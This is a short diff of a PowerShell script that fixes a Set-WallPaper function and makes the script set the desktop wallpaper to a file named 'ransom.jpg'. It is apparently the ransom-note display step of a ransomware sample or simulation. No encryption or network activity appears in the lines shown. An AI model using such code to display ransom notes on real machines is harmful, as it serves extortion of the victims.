@@ -72,5 +72,6 @@ Function Set-WallPaper {
       
         $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
     }
-    
-    Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Fit
+}
+
+Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Fit
